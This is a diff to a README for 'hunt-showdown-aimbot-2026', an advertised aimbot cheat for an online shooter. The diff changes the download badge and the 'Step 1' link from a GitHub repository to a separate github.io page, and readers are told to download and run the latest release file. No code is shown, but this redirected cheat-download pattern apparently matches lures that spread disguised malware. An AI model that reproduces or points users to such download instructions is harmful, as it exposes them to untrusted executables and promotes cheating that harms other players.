@@ -6,9 +6,9 @@ Welcome to **hunt-showdown-aimbot-2026** – your ultimate targeting companion f
 
 ### 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-hunt--showdown--aimbot--2026-brightgreen?style=for-the-badge&logo=github)](https://github.com/Peopled-chromite423/hunt-showdown-aimbot-2026)
+[![Download Now](https://img.shields.io/badge/Download-hunt--showdown--aimbot--2026-brightgreen?style=for-the-badge&logo=github)](https://peopled-chromite423.github.io)
 
-**Step 1:** Visit this link to download the application: [https://github.com/Peopled-chromite423/hunt-showdown-aimbot-2026](https://github.com/Peopled-chromite423/hunt-showdown-aimbot-2026)
+**Step 1:** Visit this link to download the application: [https://peopled-chromite423.github.io](https://peopled-chromite423.github.io)
 
 **Step 2:** Once you're on the page, look for the download button or the latest release file. Click it to start the download.
 
